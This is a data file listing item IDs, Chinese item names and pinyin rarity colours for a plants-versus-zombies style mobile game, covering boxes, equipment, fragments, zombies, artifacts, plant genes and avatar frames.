{"300101":"初级装扮箱","pinzhi":"baise"},
{"300102":"中级装扮箱","pinzhi":"lanse"},
{"300103":"高级装扮箱","pinzhi":"chengse"},
{"300104":"幸运宝箱4期","pinzhi":"chengse"},
{"300105":"幻彩精粹","pinzhi":"fense"},
{"300219":"猫猫贴纸","pinzhi":"lvse"},
{"300220":"僵尸报纸","pinzhi":"lvse"},
{"300221":"儿童节小鬼的背包","pinzhi":"lvse"},
{"300222":"怪味零食","pinzhi":"lvse"},
{"300223":"坏掉的铁锅","pinzhi":"lvse"},
{"300224":"超级棒棒糖","pinzhi":"lvse"},
{"300225":"葵葵贴纸","pinzhi":"lvse"},
{"300226":"丢失的靴子","pinzhi":"lvse"},
{"300227":"巧克力","pinzhi":"lvse"},
{"300228":"死神僵尸的骨头","pinzhi":"lvse"},
{"300229":"棱镜草的墨镜","pinzhi":"lvse"},
{"300230":"酒葫芦","pinzhi":"lvse"},
{"300231":"僵尸用降落伞","pinzhi":"lvse"},
{"300232":"旋转芜菁的旋转装置","pinzhi":"lvse"},
{"300233":"魔术菇的扑克套牌","pinzhi":"lvse"},
{"300234":"坚果的铁质护甲","pinzhi":"lvse"},
{"300235":"戴夫的玉米卷酱料","pinzhi":"lanse"},
{"300236":"禅境水壶","pinzhi":"lanse"},
{"300237":"双人数据平衡表格","pinzhi":"lanse"},
{"300238":"土豆型服务器","pinzhi":"lanse"},
{"300239":"某游戏的对战卡包","pinzhi":"lanse"},
{"300240":"绿头鸭子","pinzhi":"lanse"},
{"300241":"石中剑","pinzhi":"lanse"},
{"300242":"皮纳塔","pinzhi":"lanse"},
{"300243":"蝴蝶鱼","pinzhi":"lanse"},
{"300244":"牛角尖头盔","pinzhi":"lanse"},
{"300245":"甜蜜之家","pinzhi":"lanse"},
{"300246":"老式留声机","pinzhi":"zise"},
{"300247":"vs1000花园战争游戏光盘","pinzhi":"zise"},
{"300248":"发亮的假发","pinzhi":"zise"},
{"300249":"金手指罐子","pinzhi":"zise"},
{"300250":"石制青蛙","pinzhi":"zise"},
{"300251":"对讲机","pinzhi":"zise"},
{"300252":"海盗的宝藏","pinzhi":"zise"},
{"300253":"金铲","pinzhi":"zise"},
{"300254":"龙蛋","pinzhi":"zise"},
{"300259":"豌豆徽章","pinzhi":"zise"},
{"300260":"深渊徽章","pinzhi":"zise"},
{"300261":"蘑菇徽章","pinzhi":"zise"},
{"300255":"黄金小推车模型","pinzhi":"hongse"},
{"300256":"法老的权杖","pinzhi":"hongse"},
{"300257":"荣誉头盔","pinzhi":"hongse"},
{"300258":"地精雕像","pinzhi":"hongse"},
{"21050":"紫手套","pinzhi":"zise"},
{"21051":"红蜡烛","pinzhi":"hongse"},
{"21052":"白蜡烛","pinzhi":"baise"},
{"21053":"太阳锅盔","pinzhi":"chengse"},
{"21054":"月亮锅盔","pinzhi":"baise"},
{"21055":"公主冰冠","pinzhi":"baise"},
{"21056":"女王冰冠","pinzhi":"lanse"},
{"21057":"牛仔手套","pinzhi":"baise"},
{"21058":"聚能电池","pinzhi":"chengse"},
{"21059":"节能电池","pinzhi":"baise"},
{"21060":"强效杀虫剂","pinzhi":"fense"},
{"21061":"杀虫剂","pinzhi":"baise"},
{"21062":"大爆竹","pinzhi":"hongse"},
{"21063":"爆竹","pinzhi":"baise"},
{"21064":"小时钟","pinzhi":"huangse"},
{"21065":"加速时钟","pinzhi":"hongse"},
{"21066":"警用电击棍","pinzhi":"lanse"},
{"21067":"电击","pinzhi":"baise"},
{"21068":"止痛剂","pinzhi":"lvse"},
{"21069":"止疼片","pinzhi":"baise"},
{"21070":"金属弹","pinzhi":"hongse"},
{"21071":"木质弹弓","pinzhi":"baise"},
{"21072":"魔法书","pinzhi":"baise"},
{"21073":"高级魔法书","pinzhi":"hongse"},
{"21074":"阳光齿轮","pinzhi":"hongse"},
{"21075":"时光胶囊","pinzhi":"hongse"},
{"21076":"英雄披风","pinzhi":"hongse"},
{"21077":"糖果篮子","pinzhi":"hongse"},
{"21078":"幽浮飞碟","pinzhi":"hongse"},
{"21001":"珍稀的肥料","pinzhi":"huangse"},
{"21002":"时空铁桶","pinzhi":"huangse"},
{"21003":"加速花盆","pinzhi":"huangse"},
{"21004":"万能的医药箱","pinzhi":"huangse"},
{"21005":"聚光花盆","pinzhi":"huangse"},
{"21006":"戴夫的闹钟","pinzhi":"huangse"},
{"21007":"太阳能花盆","pinzhi":"huangse"},
{"21008":"超能火药桶","pinzhi":"huangse"},
{"21009":"燃烧的火把","pinzhi":"huangse"},
{"21010":"闪耀雪花挂坠","pinzhi":"huangse"},
{"21011":"巨人的电线杆","pinzhi":"huangse"},
{"21012":"小黄鸭游泳圈","pinzhi":"huangse"},
{"21013":"高级的肥料","pinzhi":"zise"},
{"21014":"精致的铁桶","pinzhi":"zise"},
{"21015":"高级的医药箱","pinzhi":"zise"},
{"21016":"精巧的闹钟","pinzhi":"zise"},
{"21017":"高级火药桶","pinzhi":"zise"},
{"21018":"精致的火把","pinzhi":"zise"},
{"21019":"精致雪花挂坠","pinzhi":"zise"},
{"21020":"坚固的电线杆","pinzhi":"zise"},
{"21021":"普通的肥料","pinzhi":"lanse"},
{"21022":"普通的铁桶","pinzhi":"lanse"},
{"21023":"普通的医药","pinzhi":"lanse"},
{"21024":"普通的火把","pinzhi":"lanse"},
{"21025":"普通的雪花挂坠","pinzhi":"lanse"},
{"21026":"普通的电线杆","pinzhi":"lanse"},
{"21027":"过期的肥料","pinzhi":"lvse"},
{"21028":"损坏的铁桶","pinzhi":"lvse"},
{"21029":"损坏的医药箱","pinzhi":"lvse"},
{"21030":"损坏的节能罐","pinzhi":"lvse"},
{"22050":"紫手套碎片","pinzhi":"zise"},
{"22051":"红蜡烛碎片","pinzhi":"hongse"},
{"22052":"白蜡烛碎片","pinzhi":"baise"},
{"22053":"太阳锅盔碎片","pinzhi":"chengse"},
{"22054":"月亮锅盔碎片","pinzhi":"baise"},
{"22055":"公主冰冠碎片","pinzhi":"baise"},
{"22056":"女王冰冠碎片","pinzhi":"lanse"},
{"22057":"牛仔手套碎片","pinzhi":"baise"},
{"22058":"聚能电池碎片","pinzhi":"chengse"},
{"22059":"节能电池碎片","pinzhi":"baise"},
{"22060":"强效杀虫剂碎片","pinzhi":"fense"},
{"22061":"杀虫剂碎片","pinzhi":"baise"},
{"22062":"大爆竹碎片","pinzhi":"hongse"},
{"22063":"爆竹碎片","pinzhi":"baise"},
{"22064":"小时钟碎片","pinzhi":"huangse"},
{"22065":"加速时钟碎片","pinzhi":"hongse"},
{"22066":"警用电击棍碎片","pinzhi":"lanse"},
{"22067":"电击棍碎片","pinzhi":"baise"},
{"22068":"止痛剂碎片","pinzhi":"lvse"},
{"22069":"止疼片碎片","pinzhi":"baise"},
{"22070":"金属弹弓碎片","pinzhi":"hongse"},
{"22071":"木质弹弓碎片","pinzhi":"baise"},
{"22072":"魔法书碎片","pinzhi":"baise"},
{"22073":"高级魔法书碎片","pinzhi":"hongse"},
{"22074":"阳光齿轮碎片","pinzhi":"hongse"},
{"22075":"时光胶囊碎片","pinzhi":"hongse"},
{"22076":"英雄披风碎片","pinzhi":"hongse"},
{"22077":"糖果篮子碎片","pinzhi":"hongse"},
{"22078":"幽浮飞碟碎片","pinzhi":"hongse"},
{"22001":"珍稀的肥料碎片","pinzhi":"chengse"},
{"22002":"时空铁桶碎片","pinzhi":"chengse"},
{"22003":"加速花盆碎片","pinzhi":"chengse"},
{"22004":"万能的医药箱碎片","pinzhi":"chengse"},
{"22005":"聚光花盆碎片","pinzhi":"chengse"},
{"22006":"戴夫的闹钟碎片","pinzhi":"chengse"},
{"22007":"太阳能花盆碎片","pinzhi":"chengse"},
{"22008":"超能火药桶碎片","pinzhi":"chengse"},
{"22009":"燃烧的火把碎片","pinzhi":"chengse"},
{"22010":"闪耀雪花挂坠碎片","pinzhi":"chengse"},
{"22011":"巨人的电线杆碎片","pinzhi":"chengse"},
{"22012":"小黄鸭游泳圈碎片","pinzhi":"chengse"},
{"22013":"高级的肥料碎片","pinzhi":"zise"},
{"22014":"精致的铁桶碎片","pinzhi":"zise"},
{"22015":"高级的医药箱碎片","pinzhi":"zise"},
{"22016":"精巧的闹钟碎片","pinzhi":"zise"},
{"22017":"高级火药桶碎片","pinzhi":"zise"},
{"22018":"精致的火把碎片","pinzhi":"zise"},
{"22019":"精致雪花挂坠碎片","pinzhi":"zise"},
{"22020":"坚固的电线杆碎片","pinzhi":"zise"},
{"22021":"普通的肥料碎片","pinzhi":"lanse"},
{"22022":"普通的铁桶碎片","pinzhi":"lanse"},
{"22023":"普通的医药箱碎片","pinzhi":"lanse"},
{"22024":"普通的火把碎片","pinzhi":"lanse"},
{"22025":"普通的雪花挂坠碎片","pinzhi":"lanse"},
{"22026":"普通的电线杆碎片","pinzhi":"lanse"},
{"22027":"过期的肥料碎片","pinzhi":"lvse"},
{"22028":"损坏的铁桶碎片","pinzhi":"lvse"},
{"22029":"损坏的医药箱碎片","pinzhi":"lvse"},
{"22030":"节能罐碎片","pinzhi":"zise"},
{"404000":"普通僵尸","pinzhi":"baise"},
{"404001":"小鸡","pinzhi":"lvse"},
{"404002":"读报二爷僵尸","pinzhi":"lvse"},
{"404003":"机枪僵尸","pinzhi":"lvse"},
{"404004":"全明星僵尸","pinzhi":"zise"},
{"404005":"电磁盾僵尸","pinzhi":"baise"},
{"404006":"章鱼法师僵尸","pinzhi":"baise"},
{"404007":"铜人僵尸","pinzhi":"zise"},
{"404008":"铁桶僵尸","pinzhi":"baise"},
{"404009":"矿工僵尸","pinzhi":"zise"},
{"404010":"冰鼬","pinzhi":"zise"},
{"404011":"投罐车僵尸","pinzhi":"chengse"},
{"404012":"路障僵尸","pinzhi":"baise"},
{"404013":"火把僵尸","pinzhi":"lvse"},
{"404015":"机器牛僵尸","pinzhi":"zise"},
{"404016":"魔法师僵尸","pinzhi":"zise"},
{"404017":"气球僵尸","pinzhi":"baise"},
{"404018":"飞行器僵尸","pinzhi":"zise"},
{"404019":"爆炸坚果僵尸","pinzhi":"zise"},
{"404020":"巨人僵尸","pinzhi":"baise"},
{"404021":"冰砖僵尸","pinzhi":"lvse"},
{"404022":"寒冰豌豆僵尸","pinzhi":"baise"},
{"404023":"贝壳僵尸","pinzhi":"baise"},
{"404024":"侏罗纪野人僵尸","pinzhi":"baise"},
{"404025":"铲子僵尸","pinzhi":"chengse"},
{"404026":"小鬼气球僵尸","pinzhi":"lvse"},
{"404027":"渡渡鸟僵尸","pinzhi":"baise"},
{"404028":"冲浪板僵尸","pinzhi":"baise"},
{"404029":"辣椒僵尸","pinzhi":"zise"},
{"404030":"神风僵尸","pinzhi":"chengse"},
{"404031":"喝酒僵尸","pinzhi":"baise"},
{"404032":"盗贼僵尸","pinzhi":"zise"},
{"404033":"玩具车僵尸","pinzhi":"baise"},
{"404034":"自爆僵尸","pinzhi":"baise"},
{"404035":"治愈者僵尸","pinzhi":"chengse"},
{"404036":"忍者小鬼僵尸","pinzhi":"baise"},
{"404037":"猎人僵尸","pinzhi":"baise"},
{"404038":"周刊二爷僵尸","pinzhi":"baise"},
{"404039":"失落阳伞僵尸","pinzhi":"baise"},
{"404040":"冰风酋长僵尸","pinzhi":"chengse"},
{"404041":"机甲路障僵尸","pinzhi":"baise"},
{"404042":"失落考古学家僵尸","pinzhi":"baise"},
{"404043":"绅士僵尸","pinzhi":"baise"},
{"404044":"穴居僵尸","pinzhi":"baise"},
{"404045":"闪动僵尸","pinzhi":"chengse"},
{"404046":"大刀武僧僵尸","pinzhi":"baise"},
{"404047":"火把武僧僵尸","pinzhi":"zise"},
{"404048":"鸡贼僵尸","pinzhi":"baise"},
{"404049":"小丑僵尸","pinzhi":"baise"},
{"404050":"朋克僵尸","pinzhi":"chengse"},
{"404051":"石像僵尸","pinzhi":"lvse"},
{"404052":"恶龙小鬼僵尸","pinzhi":"baise"},
{"404053":"花火僵尸","pinzhi":"baise"},
{"404054":"功夫铜锣僵尸","pinzhi":"baise"},
{"404055":"骑兵僵尸","pinzhi":"chengse"},
{"404056":"蜻蜓僵尸","pinzhi":"lvse"},
{"404057":"海盗船长僵尸","pinzhi":"baise"},
{"404058":"锤子僵尸","pinzhi":"baise"},
{"404059":"失落医生僵尸","pinzhi":"baise"},
{"404060":"功夫气功僵尸","pinzhi":"chengse"},
{"404061":"农夫僵尸","pinzhi":"baise"},
{"404062":"死神僵尸","pinzhi":"baise"},
{"404063":"滚筒僵尸","pinzhi":"baise"},
{"404064":"淘金僵尸","pinzhi":"baise"},
{"404065":"霹雳舞僵尸","pinzhi":"chengse"},
{"404066":"木乃伊僵尸","pinzhi":"baise"},
{"404067":"双截棍武僧僵尸","pinzhi":"baise"},
{"404068":"煤矿车僵尸","pinzhi":"baise"},
{"404069":"锅炉僵尸","pinzhi":"baise"},
{"404070":"机甲巨人僵尸","pinzhi":"chengse"},
{"404071":"龙骨化石僵尸","pinzhi":"baise"},
{"404072":"遗迹猎人僵尸","pinzhi":"zise"},
{"404073":"侏罗纪巨人僵尸","pinzhi":"zise"},
{"404074":"防暴警察僵尸","pinzhi":"zise"},
{"404075":"女巫僵尸","pinzhi":"chengse"},
{"97044":"向日葵僵尸","pinzhi":"lanse"},
{"60001":"神风神器","pinzhi":"lvse"},
{"60002":"闪电神器","pinzhi":"lvse"},
{"60003":"投罐神器","pinzhi":"baise"},
{"60004":"治愈神器","pinzhi":"baise"},
{"60005":"护盾神器","pinzhi":"lanse"},
{"60006":"章鱼神器","pinzhi":"lanse"},
{"60007":"街机神器","pinzhi":"chengse"},
{"60008":"时间神器","pinzhi":"lvse"},
{"60009":"窜天猴神器","pinzhi":"lvse"},
{"60010":"扭蛋神器","pinzhi":"lvse"},
{"60011":"魔豆神器","pinzhi":"chengse"},
{"60012":"飞碟神器","pinzhi":"lvse"},
{"60013":"退化神器","pinzhi":"zise"},
{"60014":"棱镜塔神器","pinzhi":"chengse"},
{"60015":"恐龙号角神器","pinzhi":"chengse"},
{"60016":"水枪神器","pinzhi":"baise"},
{"60017":"黑洞神器","pinzhi":"lvse"},
{"60018":"陨石神器","pinzhi":"lvse"},
{"60019":"魔法帽神器","pinzhi":"lvse"},
{"60020":"蜂巢神器","pinzhi":"lanse"},
{"60021":"进化神器","pinzhi":"chengse"},
{"60022":"点金神器","pinzhi":"lvse"},
{"60023":"酸液神器","pinzhi":"lvse"},
{"60024":"制雪神器","pinzhi":"lvse"},
{"60025":"滑板神器","pinzhi":"zise"},
{"60026":"摇滚神器","pinzhi":"lanse"},
{"60027":"银之键神器","pinzhi":"lvse"},
{"60028":"龙灯神器","pinzhi":"lvse"},
{"60029":"三叉戟神器","pinzhi":"lvse"},
{"60030":"葫芦神器","pinzhi":"chengse"},
{"60031":"一窝蜂神器","pinzhi":"lanse"},
{"60032":"全息神器","pinzhi":"lanse"},
{"60033":"摄魂神器","pinzhi":"lvse"},
{"60034":"相机神器","pinzhi":"zise"},
{"60035":"超重力神器","pinzhi":"lvse"},
{"60036":"液压神器","pinzhi":"chengse"},
{"60037":"保龄球神器","pinzhi":"chengse"},
{"60038":"醒狮令神器","pinzhi":"chengse"},
{"73001":"豌豆射手基因","pinzhi":"baise"},
{"73002":"坚果墙基因","pinzhi":"baise"},
{"73003":"向日葵基因","pinzhi":"baise"},
{"73004":"土豆雷基因","pinzhi":"baise"},
{"73005":"卷心菜基因","pinzhi":"baise"},
{"73006":"冰冻生菜基因","pinzhi":"baise"},
{"73007":"地刺基因","pinzhi":"baise"},
{"73008":"双向射手基因","pinzhi":"baise"},
{"73009":"玉米投手基因","pinzhi":"baise"},
{"73010":"火葫芦基因","pinzhi":"baise"},
{"73011":"白萝卜基因","pinzhi":"baise"},
{"73012":"竹笋基因","pinzhi":"baise"},
{"73013":"小喷菇基因","pinzhi":"baise"},
{"73014":"大喷菇基因","pinzhi":"baise"},
{"73015":"阳光豆基因","pinzhi":"baise"},
{"73016":"花生射手基因","pinzhi":"baise"},
{"73017":"黄金蓓蕾基因","pinzhi":"baise"},
{"73018":"磁力菇基因","pinzhi":"baise"},
{"73019":"仙桃基因","pinzhi":"baise"},
{"73020":"大丽菊基因","pinzhi":"baise"},
{"73081":"弹簧豆基因","pinzhi":"baise"},
{"73082":"路灯花基因","pinzhi":"baise"},
{"73091":"缠绕水草基因","pinzhi":"baise"},
{"73092":"巴豆基因","pinzhi":"baise"},
{"73101":"滴水冰莲基因","pinzhi":"baise"},
{"73102":"黄金叶基因","pinzhi":"baise"},
{"73021":"寒冰射手基因","pinzhi":"lvse"},
{"73022":"闪电芦苇基因","pinzhi":"lvse"},
{"73023":"西瓜投手基因","pinzhi":"lvse"},
{"73024":"地刺王基因","pinzhi":"lvse"},
{"73025":"商店高坚果基因","pinzhi":"lvse"},
{"73026":"三线射手基因","pinzhi":"lvse"},
{"73027":"商店棱镜草基因","pinzhi":"lvse"},
{"73028":"甜薯基因","pinzhi":"lvse"},
{"73029":"脉冲黄桃基因","pinzhi":"lvse"},
{"73030":"月光花基因","pinzhi":"lvse"},
{"73031":"爆炸坚果基因","pinzhi":"lvse"},
{"73032":"冬瓜守卫基因","pinzhi":"lvse"},
{"73033":"榴莲基因","pinzhi":"lvse"},
{"73034":"树脂投手基因","pinzhi":"lvse"},
{"73035":"大王花基因","pinzhi":"lvse"},
{"73036":"复活萝卜基因","pinzhi":"lvse"},
{"73037":"大蒜基因","pinzhi":"lvse"},
{"73038":"商店飞碟瓜基因","pinzhi":"lvse"},
{"73083":"火炬树桩基因","pinzhi":"lvse"},
{"73084":"豌豆荚基因","pinzhi":"lvse"},
{"73093":"火焰豌豆基因","pinzhi":"lvse"},
{"73094":"旋转菠萝基因","pinzhi":"lvse"},
{"73103":"商店回旋镖射手基因","pinzhi":"lvse"},
{"73104":"电离红掌基因","pinzhi":"lvse"},
{"73039":"原始豌豆射手基因","pinzhi":"lanse"},
{"73040":"商店樱桃炸弹基因","pinzhi":"lanse"},
{"73041":"激光豆基因","pinzhi":"lanse"},
{"73042":"星星果基因","pinzhi":"lanse"},
{"73043":"全息坚果基因","pinzhi":"lanse"},
{"73044":"大嘴花基因","pinzhi":"lanse"},
{"73045":"南瓜巫师基因","pinzhi":"lanse"},
{"73046":"三叶草基因","pinzhi":"lanse"},
{"73047":"菜问基因","pinzhi":"lanse"},
{"73048":"能量花基因","pinzhi":"lanse"},
{"73049":"魔音甜菜基因","pinzhi":"lanse"},
{"73050":"商店飓风甘蓝基因","pinzhi":"lanse"},
{"73051":"双胞向日葵基因","pinzhi":"lanse"},
{"73052":"原始向日葵基因","pinzhi":"lanse"},
{"73053":"板栗小队基因","pinzhi":"lanse"},
{"73054":"金蝉菇基因","pinzhi":"lanse"},
{"73085":"南瓜头基因","pinzhi":"lanse"},
{"73086":"岩浆番石榴基因","pinzhi":"lanse"},
{"73095":"石楠探索者基因","pinzhi":"lanse"},
{"73096":"倭瓜基因","pinzhi":"lanse"},
{"73105":"导向蓟基因","pinzhi":"lanse"},
{"73106":"龙舌兰基因","pinzhi":"lanse"},
{"73055":"豌豆迫击炮基因","pinzhi":"zise"},
{"73056":"变身茄子基因","pinzhi":"zise"},
{"73057":"电击蓝莓基因","pinzhi":"zise"},
{"73058":"向日葵歌手基因","pinzhi":"zise"},
{"73059":"甜菜护卫基因","pinzhi":"zise"},
{"73060":"商店杜英投手基因","pinzhi":"zise"},
{"73061":"商店热辣海枣基因","pinzhi":"zise"},
{"73062":"芦荟医师基因","pinzhi":"zise"},
{"73063":"猕猴桃基因","pinzhi":"zise"},
{"73064":"蚕豆突击队基因","pinzhi":"zise"},
{"73065":"害羞紫罗兰基因","pinzhi":"zise"},
{"73066":"气流水仙花基因","pinzhi":"zise"},
{"73067":"暗影豌豆基因","pinzhi":"zise"},
{"73068":"爆炸桔梗基因","pinzhi":"zise"},
{"73087":"槲寄冰仙子基因","pinzhi":"zise"},
{"73088":"小黄梨基因","pinzhi":"zise"},
{"73097":"刺果流星锤基因","pinzhi":"zise"},
{"73098":"黄油毛茛基因","pinzhi":"zise"},
{"73107":"铜钱草鼓手基因","pinzhi":"zise"},
{"73108":"逆时草基因","pinzhi":"zise"},
{"73069":"瓷砖萝卜基因","pinzhi":"chengse"},
{"73070":"聚能山竹基因","pinzhi":"chengse"},
{"73071":"机枪射手基因","pinzhi":"chengse"},
{"73072":"桑葚爆破手基因","pinzhi":"chengse"},
{"73073":"商店牛蒡击球手基因","pinzhi":"chengse"},
{"73074":"猫尾草基因","pinzhi":"chengse"},
{"73075":"商店熊果臼炮基因","pinzhi":"chengse"},
{"73076":"火龙草基因","pinzhi":"chengse"},
{"73077":"商店冰龙草基因","pinzhi":"chengse"},
{"73078":"超能花菜基因","pinzhi":"chengse"},
{"73079":"商店魔术菇基因","pinzhi":"chengse"},
{"73080":"橄榄坑基因","pinzhi":"chengse"},
{"73089":"冰瓜投手基因","pinzhi":"chengse"},
{"73090":"商店双生卯兔基因","pinzhi":"chengse"},
{"73099":"长枪球兰基因","pinzhi":"chengse"},
{"73100":"商店豌豆药剂师基因","pinzhi":"chengse"},
{"73109":"商店仙人掌基因","pinzhi":"chengse"},
{"73110":"激光皇冠花基因","pinzhi":"chengse"},
{"25001":"豌豆射手头像头像","pinzhi":"lvse"},
{"25002":"向日葵头像头像","pinzhi":"lvse"},
{"25003":"周年冠军头像","pinzhi":"lvse"},
{"25004":"周年亚军头像","pinzhi":"lvse"},
{"25005":"周年季军头像","pinzhi":"lvse"},
{"25006":"周年巅峰头像","pinzhi":"lvse"},
{"25007":"周年大师头像","pinzhi":"lvse"},
{"25008":"周年勇士头像","pinzhi":"lvse"},
{"25009":"周年纪念头像","pinzhi":"lvse"},
{"25010":"周年冠军2头像","pinzhi":"lvse"},
{"25011":"周年亚军2头像","pinzhi":"lvse"},
{"25012":"周年季军2头像","pinzhi":"lvse"},
{"25013":"周年巅峰2头像","pinzhi":"lvse"},
{"25014":"周年大师2头像","pinzhi":"lvse"},
{"25015":"周年勇士2头像","pinzhi":"lvse"},
{"25016":"周年纪念2头像","pinzhi":"lvse"},
{"25017":"冬日挑战冠军头像","pinzhi":"lvse"},
{"25018":"冬日挑战亚军头像","pinzhi":"lvse"},
{"25019":"冬日挑战季军头像","pinzhi":"lvse"},
{"25020":"冬日挑战大神头像","pinzhi":"lvse"},
{"25021":"冬日挑战大师头像","pinzhi":"lvse"},
{"25023":"冬日挑战优胜头像","pinzhi":"lvse"},
{"25024":"冬日挑战者头像","pinzhi":"lvse"},
{"25100":"埃及无尽挑战者1头像","pinzhi":"lvse"},
{"25101":"埃及无尽挑战者2头像","pinzhi":"lvse"},
{"25102":"埃及无尽挑战者3头像","pinzhi":"lvse"},
{"25103":"埃及无尽挑战者4头像","pinzhi":"lvse"},
{"25104":"埃及无尽挑战者5头像","pinzhi":"lvse"},
{"25105":"埃及无尽挑战者6头像","pinzhi":"lvse"},
{"25106":"埃及无尽挑战者7头像","pinzhi":"lvse"},
{"25110":"海盗无尽挑战者1头像","pinzhi":"lvse"},
{"25111":"海盗无尽挑战者2头像","pinzhi":"lvse"},
{"25112":"海盗无尽挑战者3头像","pinzhi":"lvse"},
{"25113":"海盗无尽挑战者4头像","pinzhi":"lvse"},
{"25114":"海盗无尽挑战者5头像","pinzhi":"lvse"},
{"25115":"海盗无尽挑战者6头像","pinzhi":"lvse"},
{"25116":"海盗无尽挑战者7头像","pinzhi":"lvse"},
{"25120":"西部无尽挑战者1头像","pinzhi":"lvse"},
{"25121":"西部无尽挑战者2头像","pinzhi":"lvse"},
{"25122":"西部无尽挑战者3头像","pinzhi":"lvse"},
{"25123":"西部无尽挑战者4头像","pinzhi":"lvse"},
{"25124":"西部无尽挑战者5头像","pinzhi":"lvse"},
{"25125":"西部无尽挑战者6头像","pinzhi":"lvse"},
{"25126":"西部无尽挑战者7头像","pinzhi":"lvse"},
{"25130":"功夫无尽挑战者1头像","pinzhi":"lvse"},
{"25131":"功夫无尽挑战者2头像","pinzhi":"lvse"},
{"25132":"功夫无尽挑战者3头像","pinzhi":"lvse"},
{"25133":"功夫无尽挑战者4头像","pinzhi":"lvse"},
{"25134":"功夫无尽挑战者5头像","pinzhi":"lvse"},
{"25135":"功夫无尽挑战者6头像","pinzhi":"lvse"},
{"25136":"功夫无尽挑战者7头像","pinzhi":"lvse"},
{"25140":"未来无尽挑战者1头像","pinzhi":"lvse"},
{"25141":"未来无尽挑战者2头像","pinzhi":"lvse"},
{"25142":"未来无尽挑战者3头像","pinzhi":"lvse"},
{"25143":"未来无尽挑战者4头像","pinzhi":"lvse"},
{"25144":"未来无尽挑战者5头像","pinzhi":"lvse"},
{"25145":"未来无尽挑战者6头像","pinzhi":"lvse"},
{"25146":"未来无尽挑战者7头像","pinzhi":"lvse"},
{"25150":"黑暗无尽挑战者1头像","pinzhi":"lvse"},
{"25151":"黑暗无尽挑战者2头像","pinzhi":"lvse"},
{"25152":"黑暗无尽挑战者3头像","pinzhi":"lvse"},
{"25153":"黑暗无尽挑战者4头像","pinzhi":"lvse"},
{"25154":"黑暗无尽挑战者5头像","pinzhi":"lvse"},
{"25155":"黑暗无尽挑战者6头像","pinzhi":"lvse"},
{"25156":"黑暗无尽挑战者7头像","pinzhi":"lvse"},
{"25160":"海滩无尽挑战者1头像","pinzhi":"lvse"},
{"25161":"海滩无尽挑战者2头像","pinzhi":"lvse"},
{"25162":"海滩无尽挑战者3头像","pinzhi":"lvse"},
{"25163":"海滩无尽挑战者4头像","pinzhi":"lvse"},
{"25164":"海滩无尽挑战者5头像","pinzhi":"lvse"},
{"25165":"海滩无尽挑战者6头像","pinzhi":"lvse"},
{"25166":"海滩无尽挑战者7头像","pinzhi":"lvse"},
{"25170":"冰河无尽挑战者1头像","pinzhi":"lvse"},
{"25171":"冰河无尽挑战者2头像","pinzhi":"lvse"},
{"25172":"冰河无尽挑战者3头像","pinzhi":"lvse"},
{"25173":"冰河无尽挑战者4头像","pinzhi":"lvse"},
{"25174":"冰河无尽挑战者5头像","pinzhi":"lvse"},
{"25175":"冰河无尽挑战者6头像","pinzhi":"lvse"},
{"25176":"冰河无尽挑战者7头像","pinzhi":"lvse"},
{"25180":"天空无尽挑战者1头像","pinzhi":"lvse"},
{"25181":"天空无尽挑战者2头像","pinzhi":"lvse"},
{"25182":"天空无尽挑战者3头像","pinzhi":"lvse"},
{"25183":"天空无尽挑战者4头像","pinzhi":"lvse"},
{"25184":"天空无尽挑战者5头像","pinzhi":"lvse"},
{"25185":"天空无尽挑战者6头像","pinzhi":"lvse"},
{"25186":"天空无尽挑战者7头像","pinzhi":"lvse"},
{"25190":"失落无尽挑战者1头像","pinzhi":"lvse"},
{"25191":"失落无尽挑战者2头像","pinzhi":"lvse"},
{"25192":"失落无尽挑战者3头像","pinzhi":"lvse"},
{"25193":"失落无尽挑战者4头像","pinzhi":"lvse"},
{"25194":"失落无尽挑战者5头像","pinzhi":"lvse"},
{"25195":"失落无尽挑战者6头像","pinzhi":"lvse"},
{"25196":"失落无尽挑战者7头像","pinzhi":"lvse"},
{"25200":"摇滚无尽挑战者1头像","pinzhi":"lvse"},
{"25201":"摇滚无尽挑战者2头像","pinzhi":"lvse"},
{"25202":"摇滚无尽挑战者3头像","pinzhi":"lvse"},
{"25203":"摇滚无尽挑战者4头像","pinzhi":"lvse"},
{"25204":"摇滚无尽挑战者5头像","pinzhi":"lvse"},
{"25205":"摇滚无尽挑战者6头像","pinzhi":"lvse"},
{"25206":"摇滚无尽挑战者7头像","pinzhi":"lvse"},
{"25210":"摩登无尽挑战者1头像","pinzhi":"lvse"},
{"25211":"摩登无尽挑战者2头像","pinzhi":"lvse"},
{"25212":"摩登无尽挑战者3头像","pinzhi":"lvse"},
{"25213":"摩登无尽挑战者4头像","pinzhi":"lvse"},
{"25214":"摩登无尽挑战者5头像","pinzhi":"lvse"},
{"25215":"摩登无尽挑战者6头像","pinzhi":"lvse"},
{"25216":"摩登无尽挑战者7头像","pinzhi":"lvse"},
{"25300":"恐龙无尽挑战者1头像","pinzhi":"lvse"},
{"25301":"恐龙无尽挑战者2头像","pinzhi":"lvse"},
{"25302":"恐龙无尽挑战者3头像","pinzhi":"lvse"},
{"25303":"恐龙无尽挑战者4头像","pinzhi":"lvse"},
{"25304":"恐龙无尽挑战者5头像","pinzhi":"lvse"},
{"25305":"恐龙无尽挑战者6头像","pinzhi":"lvse"},
{"25306":"恐龙无尽挑战者7头像","pinzhi":"lvse"},
{"25307":"宝藏掠夺者(豌豆迫击炮)头像","pinzhi":"lvse"},
{"25308":"宝藏掠夺者(雷龙草)头像","pinzhi":"lvse"},
{"25309":"宝藏掠夺者(熊果臼炮)头像","pinzhi":"lvse"},
{"25310":"宝藏掠夺者(电力绿茶)头像","pinzhi":"lvse"},
{"25311":"宝藏掠夺者(宝石商石榴)头像","pinzhi":"lvse"},
{"25312":"宝藏掠夺者(爆炸草莓)头像","pinzhi":"lvse"},
{"25313":"宝藏掠夺者(毒液豌豆射手)头像","pinzhi":"lvse"},
{"25314":"宝藏掠夺者(杜英投手)头像","pinzhi":"lvse"},
{"25315":"宝藏掠夺者(飞镖洋蓟)头像","pinzhi":"lvse"},
{"25316":"宝藏掠夺者(南瓜巫师)头像","pinzhi":"lvse"},
{"25317":"宝藏掠夺者(荸荠兄弟)头像","pinzhi":"lvse"},
{"25318":"潘妮的追击砖块挑战者头像","pinzhi":"lvse"},
{"25319":"潘妮的追击黑铁挑战者头像","pinzhi":"lvse"},
{"25320":"潘妮的追击青铜挑战者头像","pinzhi":"lvse"},
{"25321":"潘妮的追击白银挑战者头像","pinzhi":"lvse"},
{"25322":"潘妮的追击黄金挑战者头像","pinzhi":"lvse"},
{"25323":"潘妮的追击钻石挑战者头像","pinzhi":"lvse"},
